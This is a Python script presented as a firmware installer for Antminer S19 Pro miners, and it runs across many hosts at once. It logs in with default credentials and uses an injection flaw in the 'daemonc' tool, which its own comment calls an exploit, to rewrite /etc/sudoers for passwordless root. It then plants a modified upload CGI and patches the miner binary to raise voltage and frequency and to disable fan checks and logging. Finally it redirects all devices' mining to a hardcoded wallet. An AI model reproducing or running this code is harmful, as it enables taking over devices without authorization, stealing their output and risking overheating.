#!/usr/bin/env python3
"""
HashSource Installer - Installs patched bmminer on Antminer S19 Pro devices
"""

import argparse
import os
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Any, Dict, List, Optional, Tuple

import paramiko
import requests
from keystone import KS_ARCH_ARM, KS_MODE_ARM, Ks
from requests.auth import HTTPDigestAuth

# Constants
DEFAULT_FREQUENCY = 600  # MHz
DEFAULT_VOLTAGE = 1300  # mV
HASHSOURCE_VERSION = "0.1.2"
POOL_URL = "stratum+tcp://mine.ocean.xyz:3334"
POOL_WALLET = "1GRfspGGx4Ne66YotWuosUc4WeJLfGE3dZ"

# Binary patch offsets
PATCH_OFFSETS = {
    "frequency1": 0x24F58,
    "frequency2": 0x24A20,
    "voltage1": 0x24C24,
    "voltage2": 0x24C28,
    "disable_fans1": 0x3DFC,
    "disable_fans2": 0x3ED4,
    "disable_log1": 0x50354,
    "disable_log2": 0x3E78,
}


class HashSourceInstaller:
    """Installer for HashSource firmware on Antminer devices"""

    def __init__(self, host: str, username: str = "miner", password: str = "miner"):
        self.host = host
        self.username = username
        self.password = password
        self.ssh_client: Optional[paramiko.SSHClient] = None
        self.device_info: Optional[Dict[str, Any]] = None

    def connect_ssh(self) -> bool:
        """Establish SSH connection to the device"""
        try:
            self.ssh_client = paramiko.SSHClient()
            self.ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            self.ssh_client.connect(
                self.host,
                port=22,
                username=self.username,
                password=self.password,
                timeout=10,
            )
            return True
        except Exception as e:
            print(f"[{self.host}] SSH connection failed: {e}")
            return False

    def run_command(self, command: str, timeout: int = 30) -> Tuple[bool, str]:
        """Execute command via SSH with timeout"""
        if not self.ssh_client:
            return False, "SSH client not connected"

        try:
            _, stdout, stderr = self.ssh_client.exec_command(command, timeout=timeout)
            output = stdout.read().decode("utf-8")
            error = stderr.read().decode("utf-8")
            return True, output if not error else error
        except Exception as e:
            return False, str(e)

    def get_system_info(self) -> Optional[Dict[str, Any]]:
        """Get device system information"""
        try:
            url = f"http://{self.host}/cgi-bin/get_system_info.cgi"
            response = requests.get(url, auth=HTTPDigestAuth("root", "root"), timeout=5)
            if response.status_code == 200:
                self.device_info = response.json()
                return self.device_info
            return None
        except Exception as e:
            print(f"[{self.host}] Failed to get system info: {e}")
            return None

    def check_device_compatibility(self) -> bool:
        """Check if device is compatible with HashSource"""
        if not self.device_info:
            return False

        # Check if already running HashSource
        firmware_type = self.device_info.get("firmware_type", "")
        if firmware_type == "HashSource":
            print(f"[{self.host}] Already running custom firmware: {firmware_type}")
            return False

        # Check model compatibility
        miner_type = self.device_info.get("minertype", "")
        if miner_type != "Antminer S19 Pro":
            print(f"[{self.host}] Unsupported model: {miner_type}")
            return False

        return True

    def gain_sudo_access(self) -> bool:
        """Gain sudo access on the device"""
        # Check if already has sudo
        success, output = self.run_command("echo 'miner' | sudo --stdin -l -U miner")
        if success and "miner may run the following commands on" in output:
            print(f"[{self.host}] Already has sudo access")
            return True

        print(f"[{self.host}] Gaining sudo access...")

        # Exploit daemonc to modify sudoers
        commands = [
            "daemonc \\;chown\\ miner\\ /etc/sudoers",
            "daemonc \\;chmod\\ 777\\ /etc/sudoers",
            "echo 'miner\tALL=(ALL:ALL) NOPASSWD: ALL' >> /etc/sudoers",
            "daemonc \\;chown\\ root\\ /etc/sudoers",
            "daemonc \\;chmod\\ 700\\ /etc/sudoers",
        ]

        for cmd in commands:
            success, _ = self.run_command(cmd)
            if not success:
                print(f"[{self.host}] Failed to gain sudo access at: {cmd}")
                return False

        return True

    def configure_pools(self) -> bool:
        """Configure mining pools"""
        if not self.device_info:
            return False

        mac_address = self.device_info.get("macaddr", "").replace(":", "")

        # Pool configuration
        pool_config: Dict[str, Any] = {
            "bitmain-fan-ctrl": False,
            "bitmain-fan-pwm": "100",
            "freq-level": "100",
            "miner-mode": "0",
            "pools": [
                {"url": POOL_URL, "user": f"{POOL_WALLET}.{mac_address}", "pass": ""}
            ]
            * 3,  # Same pool 3 times
        }

        try:
            url = f"http://{self.host}/cgi-bin/set_miner_conf.cgi"
            response = requests.post(
                url, auth=HTTPDigestAuth("root", "root"), json=pool_config, timeout=60
            )
            return response.status_code == 200
        except Exception as e:
            print(f"[{self.host}] Failed to configure pools: {e}")
            return False

    def prepare_system(self) -> bool:
        """Prepare system for HashSource installation"""
        print(f"[{self.host}] Preparing system...")

        commands = [
            # Create update.cgi for binary upload
            "sudo cp /www/pages/cgi-bin/upgrade.cgi /www/pages/cgi-bin/update.cgi",
            "sudo sed -i 's|file=$folder/update.bmu|file=/tmp/update_file|g' /www/pages/cgi-bin/update.cgi",
            "sudo sed -i 's|rm -rf $file||g' /www/pages/cgi-bin/update.cgi",
            "sudo chmod 755 /www/pages/cgi-bin/update.cgi",
            # Move levels.json to prevent stock freq/volt loading
            "sudo mv /etc/levels.json /etc/levels.json.bak 2>/dev/null || true",
            # Update version info
            f"sudo sed -i '1s/.*/{HASHSOURCE_VERSION}/' /usr/bin/compile_time",
            "sudo sed -i 's|Release|HashSource|g' /usr/bin/compile_time",
        ]

        for cmd in commands:
            success, _ = self.run_command(cmd)
            # Don't fail on optional commands (with 2>/dev/null)
            if not success and "2>/dev/null" not in cmd:
                print(f"[{self.host}] Command failed: {cmd}")
                return False

        return True

    def generate_arm_opcode(self, value: int, register: str) -> bytes:
        """Generate ARM MOV instruction opcode using Keystone assembler"""
        try:
            # Initialize Keystone assembler for ARM
            ks = Ks(KS_ARCH_ARM, KS_MODE_ARM)

            # Generate the MOV instruction
            arm_code = f"mov {register}, #{value}"

            # Assemble the instruction
            encoding, count = ks.asm(arm_code)

            if encoding and count > 0:
                # Return the assembled bytes
                return bytes(encoding)
            else:
                raise ValueError(f"Failed to assemble: {arm_code}")

        except Exception as e:
            print(f"[{self.host}] Error generating ARM opcode: {e}")
            # Fallback to manual encoding if Keystone fails
            return self._manual_arm_opcode(value, register)

    def _manual_arm_opcode(self, value: int, register: str) -> bytes:
        """Manual ARM opcode generation as fallback"""
        reg_map = {"r0": 0, "r2": 2}
        if register not in reg_map:
            raise ValueError(f"Unsupported register: {register}")

        reg_num = reg_map[register]

        # MOV instruction encoding for ARM
        if value <= 255:
            # Simple immediate: MOV Rd, #imm8
            opcode = 0xE3A00000 | (reg_num << 12) | value
        else:
            # MOVW for larger values (lower 16 bits)
            # MOVW Rd, #imm16
            imm16 = value & 0xFFFF
            imm4 = (imm16 >> 12) & 0xF
            imm12 = imm16 & 0xFFF
            opcode = 0xE3000000 | (imm4 << 16) | (reg_num << 12) | imm12

        # Pack as little-endian 32-bit integer
        import struct

        return struct.pack("<I", opcode)

    def patch_bmminer(
        self, frequency: int = DEFAULT_FREQUENCY, voltage: int = DEFAULT_VOLTAGE
    ) -> Optional[bytes]:
        """Patch bmminer binary with custom frequency and voltage"""
        bmminer_path = "bmminer_no_fan_check"

        if not os.path.exists(bmminer_path):
            print(f"[{self.host}] bmminer template not found: {bmminer_path}")
            return None

        print(f"[{self.host}] Patching bmminer: freq={frequency}MHz, volt={voltage}mV")

        with open(bmminer_path, "rb") as f:
            bmminer_data = bytearray(f.read())

        # Generate opcodes
        freq_opcode = self.generate_arm_opcode(frequency, "r2")
        volt_opcode = self.generate_arm_opcode(voltage, "r0")

        # Apply patches
        # Frequency patches
        bmminer_data[PATCH_OFFSETS["frequency1"] : PATCH_OFFSETS["frequency1"] + 4] = (
            freq_opcode
        )
        bmminer_data[PATCH_OFFSETS["frequency2"] : PATCH_OFFSETS["frequency2"] + 4] = (
            freq_opcode
        )

        # Voltage patches
        bmminer_data[PATCH_OFFSETS["voltage1"] : PATCH_OFFSETS["voltage1"] + 4] = (
            volt_opcode
        )
        bmminer_data[PATCH_OFFSETS["voltage2"] : PATCH_OFFSETS["voltage2"] + 4] = (
            volt_opcode
        )

        # Disable fan checks
        bmminer_data[PATCH_OFFSETS["disable_fans1"]] = 0x00
        bmminer_data[PATCH_OFFSETS["disable_fans2"] + 3] = 0xEB

        # Disable continuous logging
        bmminer_data[
            PATCH_OFFSETS["disable_log1"] : PATCH_OFFSETS["disable_log1"] + 3
        ] = b"\x00\x00\x00"
        bmminer_data[PATCH_OFFSETS["disable_log2"] + 3] = 0xEB

        return bytes(bmminer_data)

    def upload_bmminer(self, bmminer_data: bytes) -> bool:
        """Upload patched bmminer to device"""
        print(f"[{self.host}] Uploading patched bmminer...")

        try:
            url = f"http://{self.host}/cgi-bin/update.cgi"
            files = {
                "firmware": ("update_file", bmminer_data, "application/octet-stream")
            }
            response = requests.post(
                url, files=files, auth=HTTPDigestAuth("root", "root"), timeout=60
            )
            return response.status_code == 200
        except Exception as e:
            print(f"[{self.host}] Failed to upload bmminer: {e}")
            return False

    def install_bmminer(self) -> bool:
        """Install uploaded bmminer"""
        print(f"[{self.host}] Installing bmminer...")

        commands = [
            "sudo mv /tmp/update_file /usr/bin/bmminer",
            "sudo chmod 755 /usr/bin/bmminer",
            "sudo chown root:root /usr/bin/bmminer",
        ]

        for cmd in commands:
            success, _ = self.run_command(cmd)
            if not success:
                print(f"[{self.host}] Failed to install bmminer: {cmd}")
                return False

        return True

    def restart_bmminer(self) -> bool:
        """Restart bmminer service"""
        print(f"[{self.host}] Restarting bmminer...")
        success, _ = self.run_command("sudo /etc/init.d/S70cgminer restart")
        return success

    def install(
        self, frequency: int = DEFAULT_FREQUENCY, voltage: int = DEFAULT_VOLTAGE
    ) -> bool:
        """Main installation process"""
        mac_address = "Unknown"

        try:
            print(f"\n[{self.host}] Starting HashSource installation...")

            # Connect SSH
            if not self.connect_ssh():
                return False

            # Get system info
            if not self.get_system_info():
                print(f"[{self.host}] Failed to get system info")
                return False

            mac_address = self.device_info.get("macaddr", "Unknown")
            print(f"[{self.host}] Device MAC: {mac_address}")

            # Check compatibility
            if not self.check_device_compatibility():
                return False

            # Gain sudo access
            if not self.gain_sudo_access():
                return False

            # Configure pools
            print(f"[{self.host}] Configuring pools...")
            if not self.configure_pools():
                print(f"[{self.host}] Warning: Failed to configure pools")

            # Prepare system
            if not self.prepare_system():
                return False

            # Patch bmminer
            patched_bmminer = self.patch_bmminer(frequency, voltage)
            if not patched_bmminer:
                return False

            # Upload bmminer
            if not self.upload_bmminer(patched_bmminer):
                return False

            # Install bmminer
            if not self.install_bmminer():
                return False

            # Restart service
            if not self.restart_bmminer():
                print(f"[{self.host}] Warning: Failed to restart bmminer")

            print(f"[{self.host}] ✓ HashSource installation completed successfully!")
            print(
                f"[{self.host}] Device will mine to: {POOL_WALLET}.{mac_address.replace(':', '')}"
            )
            return True

        except Exception as e:
            print(f"[{self.host}] Installation failed: {e}")
            return False

        finally:
            if self.ssh_client:
                self.ssh_client.close()


def install_device(host: str, frequency: int, voltage: int) -> Tuple[str, bool]:
    """Install HashSource on a single device"""
    installer = HashSourceInstaller(host)
    success = installer.install(frequency, voltage)
    return host, success


def main() -> None:
    """Main entry point for the installer"""
    parser = argparse.ArgumentParser(
        description="Install HashSource firmware on Antminer S19 Pro devices",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  %(prog)s 192.168.1.100                    # Install on single device
  %(prog)s 192.168.1.100 192.168.1.101      # Install on multiple devices
  %(prog)s devices.txt               # Install from file
  %(prog)s 192.168.1.100 -f 650 -v 1350     # Custom frequency/voltage
  %(prog)s devices.txt -t 10         # Use 10 parallel threads
        """,
    )

    parser.add_argument(
        "hosts", nargs="+", help="Device IP addresses or file with IPs (one per line)"
    )
    parser.add_argument(
        "-f",
        "--frequency",
        type=int,
        default=DEFAULT_FREQUENCY,
        help=f"Target frequency in MHz (default: {DEFAULT_FREQUENCY})",
    )
    parser.add_argument(
        "-v",
        "--voltage",
        type=int,
        default=DEFAULT_VOLTAGE,
        help=f"Target voltage in mV (default: {DEFAULT_VOLTAGE})",
    )
    parser.add_argument(
        "-t",
        "--threads",
        type=int,
        default=5,
        help="Number of parallel installations (default: 5)",
    )

    args = parser.parse_args()

    # Validate parameters
    if args.frequency < 100 or args.frequency > 1000:
        print("Error: Frequency must be between 100 and 1000 MHz")
        sys.exit(1)

    if args.voltage < 1000 or args.voltage > 1500:
        print("Error: Voltage must be between 1000 and 1500 mV")
        sys.exit(1)

    # Get list of hosts
    hosts: List[str] = []
    for host_arg in args.hosts:
        if os.path.isfile(host_arg):
            # Read from file
            try:
                with open(host_arg, "r") as f:
                    hosts.extend(
                        line.strip()
                        for line in f
                        if line.strip() and not line.startswith("#")
                    )
            except IOError as e:
                print(f"Error reading file {host_arg}: {e}")
                sys.exit(1)
        else:
            # Direct IP
            hosts.append(host_arg)

    if not hosts:
        print("No hosts provided")
        sys.exit(1)

    # Remove duplicates while preserving order
    hosts = list(dict.fromkeys(hosts))

    print(f"Installing HashSource on {len(hosts)} device(s)")
    print(f"Configuration: Frequency={args.frequency}MHz, Voltage={args.voltage}mV")
    print(f"Using {args.threads} parallel threads")
    print(f"Pool: {POOL_URL}")
    print("=" * 60)

    start_time = time.time()

    # Install on all devices in parallel
    successful: List[str] = []
    failed: List[str] = []

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {
            executor.submit(install_device, host, args.frequency, args.voltage): host
            for host in hosts
        }

        for future in as_completed(futures):
            try:
                host, success = future.result(
                    timeout=300
                )  # 5 minute timeout per device
                if success:
                    successful.append(host)
                else:
                    failed.append(host)
            except Exception as e:
                host = futures[future]
                print(f"[{host}] Installation exception: {e}")
                failed.append(host)

    # Summary
    elapsed_time = time.time() - start_time
    print("\n" + "=" * 60)
    print("Installation Summary:")
    print(f"Time elapsed: {elapsed_time:.1f} seconds")
    print(f"✓ Successful: {len(successful)}/{len(hosts)}")
    if successful:
        print(f"  Devices: {', '.join(successful)}")

    if failed:
        print(f"✗ Failed: {len(failed)}/{len(hosts)}")
        print(f"  Devices: {', '.join(failed)}")

    sys.exit(0 if not failed else 1)


if __name__ == "__main__":
    main()
